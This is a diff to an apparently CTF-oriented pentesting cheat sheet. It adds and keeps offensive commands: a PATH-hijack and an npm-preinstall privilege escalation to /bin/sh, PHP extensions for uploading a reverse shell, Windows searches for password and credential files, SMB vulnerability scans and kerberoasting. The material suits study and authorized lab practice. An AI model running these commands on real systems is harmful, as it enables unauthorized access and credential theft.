@@ -14,9 +14,15 @@ Here are some handy tricks to enhance your pentesting workflow:
 #### Spawn a fully interactive shell:
 ```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
 ```
 
 <details><summary>other</summary>
+
+#### scan rpc port
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
+```
 
 #### Read file:
 ```python
@@ -41,10 +47,15 @@ cat > file << EOF
 EOF
 ```
 
-#### Set appropriate permissions for `id_rsa` file before usage:
-```linux
-chmod 600 id_rsa
+#### php extensions to run revsell
 ```
+.php
+.php3
+.php4
+.php5
+.phtml
+```
+
 #### broken png image
 ```
 xxd thm.jpg | head
@@ -120,9 +131,9 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 
 #### Discover hidden directories:
 ```linux
-wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
+wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP/island/2100/FUZZ.ticket
 
-feroxbuster -u http://10.10.46.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
+feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
 ```
 
 #### Discover subdomains with `wfuzz` :
@@ -190,6 +201,17 @@ mkdir ~/tmp
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
 sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 ```
+</details>
+
+<details><summary>PATH</summary>
+
+```
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+./app_that_calls_curl
+```
+
 </details>
 
 #### information gathering
@@ -316,28 +338,29 @@ enum4linux -h
 open SMB shares
 
 ```
-smbclient -L 10.10.251.241 
-smbclient //10.10.251.241/share # -c 'recurse;ls' 
+smbclient -L $IP
+smbclient //$IP/share # -c 'recurse;ls' 
 ```
 
 enumeration
 ```
-smbmap -H 10.10.13.234
-smbmap -H '10.10.13.234' -u '' -p '' -R 
-smbmap -H '10.10.195.72' -u '' -p '' -R -A 'enter.txt' #download file
+smbmap -H $IP
+smbmap -H '$IP' -u '' -p '' -R 
+smbmap -H '$IP' -u '' -p '' -R -A 'enter.txt' #download file
 ```
 
 scan with nmap
 
 ```
-nmap -p 139,445 -Pn -script smb-enum* 10.10.251.241
-nmap -p 139,445 -Pn -script smb-vuln* 10.10.251.241
+nmap -p 139,445 -Pn -script smb-enum* $IP
+nmap -p 139,445 -Pn -script smb-vuln* $IP
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
 ```
 
 connect with smbclient
 
 ```
-smbclient \\\\10.10.251.241\\nt4wrksv
+smbclient \\\\$IP\\nt4wrksv
 ```
 
 </details>
@@ -345,7 +368,7 @@ smbclient \\\\10.10.251.241\\nt4wrksv
 <details><summary>rdp </summary>
 
 ```
-rdesktop -u <username> -p <password> <ip> -g 70% -r disk:folder=/home/toor/cd/apps
+rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
 ```
 
 </details>
@@ -393,7 +416,7 @@ upload <file on your ps directory> #to upload file
 kerberoasting
 ```
 sudo ntpdate <target ip>
-impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip <ip> -request
+impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip $IP -request
 ```
 
 links
@@ -401,12 +424,22 @@ links
 
 </details>
 
-<details><summary>Priv esc</summary>
+<details><summary>Priv esc/enum</summary>
 
 
 ```
 whoami /priv #/groups
 net user
+net users
+net localgroups
+net user <user>
+net group /<domain>
+netsh firewall show state
+netsh firewall show config
+netstat -ano
+findstr /si password *.txt # .xml .ini
+findstr /spin "password" *.*
+dir /s *pass* == *cred* == *vnc* == *config*
 ```
 
 - [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
@@ -445,6 +478,7 @@ net user
 #### Tools
 
 * [Git research](https://github.com/internetwache/GitTools)
+* [enumeration guide](https://github.com/beyondtheoryio/Enumeration-Guide)
 
 ---
 Happy hacking!
